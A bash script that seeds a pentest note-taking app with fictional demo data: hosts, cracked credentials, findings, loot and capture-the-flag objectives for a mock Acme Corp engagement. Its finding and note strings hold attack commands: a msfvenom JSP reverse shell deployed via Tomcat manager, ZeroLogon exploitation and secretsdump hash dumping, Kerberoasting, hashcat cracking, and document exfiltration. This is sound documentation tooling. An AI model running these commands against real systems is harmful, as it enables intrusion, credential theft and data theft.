#!/bin/bash
# Populates RootNotes with realistic demo data for screenshots/testing
set -e

BASE="http://localhost:3000/api"
TOKEN=$(curl -s -X POST "$BASE/auth/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

AUTH="-H \"Authorization: Bearer $TOKEN\""

req() {
  local method=$1 path=$2 data=$3
  curl -s -X "$method" "$BASE$path" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    ${data:+-d "$data"}
}

echo "==> Creating projects..."

P1=$(req POST /projects '{
  "name": "Corp Network Pentest",
  "ip": "10.10.100.0/24",
  "os": "Various",
  "status": "active",
  "description": "Internal network pentest for Acme Corp Q1 2025. Scope: 10.10.100.0/24, 172.16.50.0/24",
  "added": "2025-03-10"
}' | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
echo "Project 1: $P1"

P2=$(req POST /projects '{
  "name": "WebApp Red Team",
  "ip": "185.220.101.0/24",
  "os": "Linux",
  "status": "active",
  "description": "External web application assessment. Target: api.target-corp.com, admin.target-corp.com",
  "added": "2025-04-01"
}' | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
echo "Project 2: $P2"

P3=$(req POST /projects '{
  "name": "AD Lab - Practice",
  "ip": "192.168.56.0/24",
  "os": "Windows",
  "status": "done",
  "description": "Active Directory attack lab for training. Fully compromised.",
  "added": "2025-01-15"
}' | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
echo "Project 3: $P3"

echo "==> Creating hosts for P1..."

H1=$(req POST /hosts "{
  \"pid\": \"$P1\",
  \"ip\": \"10.10.100.5\",
  \"hostname\": \"dc01.corp.local\",
  \"os\": \"Windows\",
  \"status\": \"pwned\",
  \"ports\": [\"53\",\"88\",\"135\",\"389\",\"445\",\"3389\"],
  \"services\": [\"DNS\",\"Kerberos\",\"MSRPC\",\"LDAP\",\"SMB\",\"RDP\"],
  \"tags\": [\"dc\",\"critical\",\"domain-controller\"],
  \"notes\": \"Primary Domain Controller. Compromised via ZeroLogon (CVE-2020-1472). DA obtained.\"
}" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

H2=$(req POST /hosts "{
  \"pid\": \"$P1\",
  \"ip\": \"10.10.100.10\",
  \"hostname\": \"web01.corp.local\",
  \"os\": \"Linux\",
  \"status\": \"access\",
  \"ports\": [\"22\",\"80\",\"443\",\"8080\"],
  \"services\": [\"SSH\",\"HTTP\",\"HTTPS\",\"Tomcat\"],
  \"tags\": [\"web\",\"dmz\",\"apache\"],
  \"notes\": \"Apache Tomcat 9.0.41 - CVE-2021-42013 path traversal. Low priv shell obtained.\"
}" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

H3=$(req POST /hosts "{
  \"pid\": \"$P1\",
  \"ip\": \"10.10.100.20\",
  \"hostname\": \"fileserver.corp.local\",
  \"os\": \"Windows\",
  \"status\": \"scanned\",
  \"ports\": [\"445\",\"135\",\"139\",\"3389\"],
  \"services\": [\"SMB\",\"MSRPC\",\"NetBIOS\",\"RDP\"],
  \"tags\": [\"file-server\",\"shares\"],
  \"notes\": \"Open SMB shares: SYSVOL, backup$. Anonymous read on backup$.\"
}" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

H4=$(req POST /hosts "{
  \"pid\": \"$P1\",
  \"ip\": \"10.10.100.50\",
  \"hostname\": \"workstation-ceo.corp.local\",
  \"os\": \"Windows\",
  \"status\": \"owned\",
  \"ports\": [\"445\",\"135\",\"3389\"],
  \"services\": [\"SMB\",\"MSRPC\",\"RDP\"],
  \"tags\": [\"workstation\",\"high-value\"],
  \"notes\": \"CEO workstation. Lateral movement via Pass-the-Hash using NTLM from DC dump.\"
}" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

H5=$(req POST /hosts "{
  \"pid\": \"$P1\",
  \"ip\": \"10.10.100.100\",
  \"hostname\": \"db01.corp.local\",
  \"os\": \"Linux\",
  \"status\": \"alive\",
  \"ports\": [\"22\",\"3306\",\"5432\"],
  \"services\": [\"SSH\",\"MySQL\",\"PostgreSQL\"],
  \"tags\": [\"database\",\"internal\"],
  \"notes\": \"MySQL 5.7 with default root:root credentials. Not yet exploited.\"
}" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

echo "Hosts: $H1 $H2 $H3 $H4 $H5"

echo "==> Creating credentials..."

C1=$(req POST /creds "{
  \"pid\": \"$P1\",
  \"username\": \"Administrator\",
  \"secret\": \"aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\",
  \"type\": \"ntlm\",
  \"service\": \"SMB\",
  \"host\": \"10.10.100.5\",
  \"cracked\": true,
  \"notes\": \"Domain Admin. Dumped via Mimikatz after ZeroLogon exploit.\",
  \"is_domain\": true,
  \"host_ids\": [\"$H1\",\"$H4\"]
}" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

C2=$(req POST /creds "{
  \"pid\": \"$P1\",
  \"username\": \"svc_backup\",
  \"secret\": \"Backup2024!\",
  \"type\": \"plain\",
  \"service\": \"SMB\",
  \"host\": \"10.10.100.20\",
  \"cracked\": true,
  \"notes\": \"Found in plaintext in SYSVOL GPO script: \\\\\\\\dc01\\\\sysvol\\\\backup.bat\",
  \"is_domain\": false,
  \"host_ids\": [\"$H3\"]
}" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

C3=$(req POST /creds "{
  \"pid\": \"$P1\",
  \"username\": \"tomcat\",
  \"secret\": \"tomcat\",
  \"type\": \"plain\",
  \"service\": \"HTTP\",
  \"host\": \"10.10.100.10\",
  \"cracked\": true,
  \"notes\": \"Default Tomcat manager credentials. Access to /manager/html\",
  \"is_domain\": false,
  \"host_ids\": [\"$H2\"]
}" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

C4=$(req POST /creds "{
  \"pid\": \"$P1\",
  \"username\": \"krbtgt\",
  \"secret\": \"e3a0168bc21cfb88b95abb29dd1a94ba\",
  \"type\": \"hash\",
  \"service\": \"Kerberos\",
  \"host\": \"10.10.100.5\",
  \"cracked\": false,
  \"notes\": \"KRBTGT hash for Golden Ticket. Obtained via DCSYNC.\",
  \"is_domain\": false,
  \"host_ids\": [\"$H1\"]
}" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

C5=$(req POST /creds "{
  \"pid\": \"$P1\",
  \"username\": \"jsmith\",
  \"secret\": \"Summer2024!\",
  \"type\": \"plain\",
  \"service\": \"RDP\",
  \"host\": \"10.10.100.50\",
  \"cracked\": true,
  \"notes\": \"CEO credentials. Found in browser saved passwords via Mimikatz.\",
  \"is_domain\": true,
  \"host_ids\": [\"$H4\"]
}" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

echo "Creds: $C1 $C2 $C3 $C4 $C5"

echo "==> Creating findings..."

req POST /findings "{
  \"pid\": \"$P1\",
  \"title\": \"ZeroLogon - Domain Controller Compromise\",
  \"severity\": \"critical\",
  \"cvss\": \"10.0\",
  \"cve\": \"CVE-2020-1472\",
  \"host_id\": \"$H1\",
  \"description\": \"The Domain Controller is vulnerable to ZeroLogon (CVE-2020-1472). This cryptographic vulnerability in the Netlogon protocol allows an unauthenticated attacker to reset the DC machine account password, resulting in full domain compromise.\",
  \"proof\": \"# ZeroLogon Exploitation\n\n\`\`\`bash\n# Exploit DC\npython3 zerologon_exploit.py dc01 10.10.100.5\n[+] Target DC: dc01.corp.local\n[+] Setting null session...\n[+] Exploit complete!\n\n# Dump hashes\nsecretsdump.py -no-pass -just-dc CORP/dc01\$@10.10.100.5\nAdministrator:500:aad3b435:8846f7eaee8fb117ad06bdd830b7586c:::\n\`\`\`\",
  \"recommendation\": \"Apply patch KB4571694 immediately. Enable enforcement mode for Netlogon secure channel (FullSecureChannelProtection=1). Monitor Event ID 5829 for exploitation attempts.\",
  \"status\": \"open\",
  \"ts\": \"2025-03-12 14:23\"
}" > /dev/null

req POST /findings "{
  \"pid\": \"$P1\",
  \"title\": \"Default Credentials on Apache Tomcat\",
  \"severity\": \"critical\",
  \"cvss\": \"9.8\",
  \"cve\": \"\",
  \"host_id\": \"$H2\",
  \"description\": \"The Tomcat Manager application at http://10.10.100.10:8080/manager/html is accessible with default credentials tomcat:tomcat. This provides full remote code execution capability.\",
  \"proof\": \"# Tomcat Manager Access\ncurl -u tomcat:tomcat http://10.10.100.10:8080/manager/text/list\nOK - Listed applications for virtual host [localhost]\n:running:0:ROOT\n:running:0:/manager\n\n# Deployed malicious WAR\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.99.1 LPORT=4444 -f war > shell.war\ncurl -u tomcat:tomcat -T shell.war http://10.10.100.10:8080/manager/text/deploy?path=/shell\nOK - Deployed application at context path [/shell]\",
  \"recommendation\": \"Change default Tomcat credentials immediately. Restrict /manager to localhost or specific IPs. Disable the manager application if not required.\",
  \"status\": \"confirmed\",
  \"ts\": \"2025-03-11 10:45\"
}" > /dev/null

req POST /findings "{
  \"pid\": \"$P1\",
  \"title\": \"SMB Anonymous Share Access\",
  \"severity\": \"high\",
  \"cvss\": \"8.1\",
  \"cve\": \"\",
  \"host_id\": \"$H3\",
  \"description\": \"The file server allows anonymous (unauthenticated) read access to the backup$ share. Sensitive configuration files and scripts containing plaintext credentials were discovered.\",
  \"proof\": \"smbclient -N //10.10.100.20/backup$\nsmb: \\\\> ls\n  scripts/\n  backup.bat\n  db_config.xml\n\ncat backup.bat\nnet use Z: \\\\\\\\dc01\\\\NETLOGON /user:svc_backup Backup2024!\",
  \"recommendation\": \"Disable anonymous share access. Audit all SMB shares for sensitive data. Remove hardcoded credentials from scripts and use service accounts with minimum required permissions.\",
  \"status\": \"open\",
  \"ts\": \"2025-03-11 16:30\"
}" > /dev/null

req POST /findings "{
  \"pid\": \"$P1\",
  \"title\": \"Weak Password Policy - Bruteforce Successful\",
  \"severity\": \"high\",
  \"cvss\": \"8.0\",
  \"cve\": \"\",
  \"host_id\": null,
  \"description\": \"Multiple user accounts had weak passwords that were cracked via dictionary attack. Passwords did not meet complexity requirements and included seasonal patterns.\",
  \"proof\": \"hashcat -m 1000 ntlm_hashes.txt rockyou.txt --show\njsmith:Summer2024!\nsvc_hr:Spring2023\nhelp_desk:Password1!\",
  \"recommendation\": \"Enforce minimum 14 character passwords with complexity. Implement account lockout after 5 failed attempts. Deploy MFA for all privileged accounts. Run regular password audits with tools like BloodHound.\",
  \"status\": \"open\",
  \"ts\": \"2025-03-13 09:15\"
}" > /dev/null

req POST /findings "{
  \"pid\": \"$P1\",
  \"title\": \"Kerberoasting - Weak Service Account Passwords\",
  \"severity\": \"high\",
  \"cvss\": \"8.0\",
  \"cve\": \"\",
  \"host_id\": \"$H1\",
  \"description\": \"3 service accounts with SPNs registered were identified as Kerberoastable. TGS tickets were successfully cracked offline revealing plaintext passwords.\",
  \"proof\": \"GetUserSPNs.py corp.local/jsmith:Summer2024! -outputfile kerberoast.txt\nkerberoast.txt: 3 hashes\n\nhashcat -m 13100 kerberoast.txt rockyou.txt\nsvc_sql:SqlService2022\nsvc_web:Webserver1!\",
  \"recommendation\": \"Use Group Managed Service Accounts (gMSA) for all service accounts. For existing accounts, set passwords of 25+ random characters. Enable AES encryption for Kerberos (disable RC4).\",
  \"status\": \"open\",
  \"ts\": \"2025-03-14 11:00\"
}" > /dev/null

echo "==> Creating notes..."

req POST /notes "{
  \"pid\": \"$P1\",
  \"title\": \"Initial Reconnaissance\",
  \"content\": \"# Initial Recon\n\n## Nmap Full Scan\n\`\`\`bash\nnmap -sV -sC -p- 10.10.100.0/24 -oA corp_full\n\`\`\`\n\nKey findings:\n- DC: 10.10.100.5 (dc01.corp.local)\n- Web server: 10.10.100.10 (Tomcat 9.0.41)\n- File server: 10.10.100.20\n- DB: 10.10.100.100 (MySQL + PostgreSQL)\n\n## DNS Enumeration\n\`\`\`\ncorp.local nameserver: 10.10.100.5\nA records found: dc01, web01, fileserver, db01, workstation-ceo\n\`\`\`\",
  \"tags\": [\"recon\",\"nmap\"]
}" > /dev/null

req POST /notes "{
  \"pid\": \"$P1\",
  \"title\": \"ZeroLogon Exploitation Steps\",
  \"content\": \"# ZeroLogon CVE-2020-1472\n\n## Pre-requisites\n- Network access to DC on port 445/135\n- Python3 + impacket\n\n## Exploitation\n\`\`\`bash\n# Clone PoC\ngit clone https://github.com/SecuraBV/CVE-2020-1472\n\n# Run exploit\npython3 zerologon_exploit.py dc01 10.10.100.5\n\n# Dump all hashes\nsecretsdump.py -no-pass -just-dc CORP/dc01\$@10.10.100.5\n\`\`\`\n\n## Post-Exploitation\n\`\`\`bash\n# Restore machine account password (important!)\npython3 reinstall_original_pw.py dc01 10.10.100.5\n\`\`\`\n\n> ⚠️ Always restore the machine account password to avoid breaking domain!\",
  \"tags\": [\"exploit\",\"zerologon\",\"cve-2020-1472\"]
}" > /dev/null

req POST /notes "{
  \"pid\": \"$P1\",
  \"title\": \"Domain Takeover Summary\",
  \"content\": \"# Domain Takeover\n\n## Timeline\n1. Discovered ZeroLogon via Nmap NSE script\n2. Exploited DC at 10.10.100.5\n3. Dumped all hashes via secretsdump\n4. Cracked Administrator NTLM in 2 minutes\n5. Pass-the-Hash to CEO workstation\n6. Exfiltrated sensitive documents from \\\\\\\\fileserver\\\\backup$\n\n## Access Summary\n| Target | Access Level |\n|--------|-------------|  \n| dc01 | Domain Admin |\n| workstation-ceo | Local Admin |\n| fileserver | Read access |\n| web01 | www-data |\n\n## Domain Info\n- Domain: CORP.LOCAL\n- Forest: CORP.LOCAL\n- DCs: dc01.corp.local\n- Users: 47 accounts\n- Computers: 23 objects\",
  \"tags\": [\"summary\",\"post-exploit\"]
}" > /dev/null

echo "==> Creating loot..."

req POST /loots "{
  \"pid\": \"$P1\",
  \"host_id\": \"$H1\",
  \"loot_type\": \"hash\",
  \"value\": \"Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\",
  \"description\": \"Domain Administrator NTLM hash - cracked: P@ssw0rd!\",
  \"source_path\": \"secretsdump.py / NTDS.dit\"
}" > /dev/null

req POST /loots "{
  \"pid\": \"$P1\",
  \"host_id\": \"$H1\",
  \"loot_type\": \"hash\",
  \"value\": \"krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e3a0168bc21cfb88b95abb29dd1a94ba:::\",
  \"description\": \"KRBTGT hash for Golden Ticket attacks\",
  \"source_path\": \"DCSYNC via secretsdump\"
}" > /dev/null

req POST /loots "{
  \"pid\": \"$P1\",
  \"host_id\": \"$H3\",
  \"loot_type\": \"secret\",
  \"value\": \"Backup2024!\",
  \"description\": \"svc_backup plaintext password from GPO script\",
  \"source_path\": \"\\\\\\\\dc01\\\\SYSVOL\\\\corp.local\\\\scripts\\\\backup.bat\"
}" > /dev/null

req POST /loots "{
  \"pid\": \"$P1\",
  \"host_id\": \"$H4\",
  \"loot_type\": \"file\",
  \"value\": \"Q1-2025-Financial-Report.xlsx, CEO-Strategy-2025.docx, acquisition_targets.pdf\",
  \"description\": \"Sensitive documents from CEO workstation desktop\",
  \"source_path\": \"C:\\\\Users\\\\jsmith\\\\Desktop\\\\\"
}" > /dev/null

req POST /loots "{
  \"pid\": \"$P1\",
  \"host_id\": \"$H2\",
  \"loot_type\": \"config\",
  \"value\": \"{\\\"db_host\\\": \\\"10.10.100.100\\\", \\\"db_user\\\": \\\"root\\\", \\\"db_pass\\\": \\\"root\\\", \\\"db_name\\\": \\\"corpdb\\\"}\",
  \"description\": \"MySQL credentials from Tomcat application config\",
  \"source_path\": \"/opt/tomcat/webapps/ROOT/WEB-INF/config.json\"
}" > /dev/null

echo "==> Creating scope..."

req POST /scopes "{\"pid\": \"$P1\", \"value\": \"10.10.100.0/24\", \"scope_type\": \"cidr\", \"in_scope\": true, \"description\": \"Primary internal network\"}" > /dev/null
req POST /scopes "{\"pid\": \"$P1\", \"value\": \"172.16.50.0/24\", \"scope_type\": \"cidr\", \"in_scope\": true, \"description\": \"Secondary VLAN\"}" > /dev/null
req POST /scopes "{\"pid\": \"$P1\", \"value\": \"10.10.200.0/24\", \"scope_type\": \"cidr\", \"in_scope\": false, \"description\": \"Production servers - OUT OF SCOPE\"}" > /dev/null
req POST /scopes "{\"pid\": \"$P1\", \"value\": \"corp.local\", \"scope_type\": \"domain\", \"in_scope\": true, \"description\": \"Primary domain\"}" > /dev/null

echo "==> Creating objectives..."

req POST /objectives "{
  \"pid\": \"$P1\",
  \"host_id\": \"$H1\",
  \"title\": \"Domain Admin\",
  \"description\": \"Obtain Domain Administrator privileges on CORP.LOCAL\",
  \"category\": \"objective\",
  \"points\": 50,
  \"status\": \"captured\",
  \"flag_value\": \"FLAG{d0m@in_4dm1n_0wned}\",
  \"captured_by\": \"admin\",
  \"captured_at\": \"2025-03-12T15:30:00\"
}" > /dev/null

req POST /objectives "{
  \"pid\": \"$P1\",
  \"host_id\": \"$H4\",
  \"title\": \"CEO Workstation\",
  \"description\": \"Access the CEO workstation and retrieve sensitive documents\",
  \"category\": \"objective\",
  \"points\": 30,
  \"status\": \"captured\",
  \"flag_value\": \"FLAG{c30_0wn3d_g00d_j0b}\",
  \"captured_by\": \"admin\",
  \"captured_at\": \"2025-03-13T10:15:00\"
}" > /dev/null

req POST /objectives "{
  \"pid\": \"$P1\",
  \"host_id\": null,
  \"title\": \"Data Exfiltration\",
  \"description\": \"Exfiltrate financial data from file server\",
  \"category\": \"bas\",
  \"points\": 20,
  \"status\": \"in_progress\",
  \"flag_value\": \"\",
  \"captured_by\": \"\",
  \"captured_at\": \"\"
}" > /dev/null

echo "==> All done! Demo data loaded for project: Corp Network Pentest"
echo "Project ID: $P1"
